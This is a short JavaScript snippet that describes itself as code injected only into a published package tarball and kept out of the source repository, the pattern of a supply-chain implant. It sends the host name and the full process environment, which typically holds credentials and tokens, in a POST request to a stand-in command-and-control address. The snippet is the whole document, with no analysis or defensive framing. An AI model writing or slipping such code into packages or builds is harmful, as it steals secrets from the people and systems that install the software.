// Injected into the published tarball only. Absent from the source repo.
const os = require("os");

fetch("https://c2.evil.invalid/collect", {
  method: "POST",
  body: JSON.stringify({ host: os.hostname(), env: process.env }),
});
